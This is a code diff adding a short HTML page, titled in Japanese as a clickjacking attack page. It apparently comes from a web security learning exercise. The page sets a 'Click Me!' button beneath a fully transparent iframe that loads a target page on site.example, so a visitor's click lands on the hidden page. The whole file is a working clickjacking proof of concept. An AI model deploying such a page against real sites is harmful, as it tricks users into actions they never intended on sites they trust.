@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>クリックジャッキングの攻撃ページ</title>
+    <style>
+      #frm {
+        position: absolute;
+        top: 0;
+        left: 0;
+        opacity: 0;
+        z-index: 1;
+      }
+    </style>
+  </head>
+  <body>
+    <button>Click Me!</button>
+    <iframe
+      id="frm"
+      src="http://site.example:3000/clickjacking_target.html"
+    ></iframe>
+  </body>
+</html>
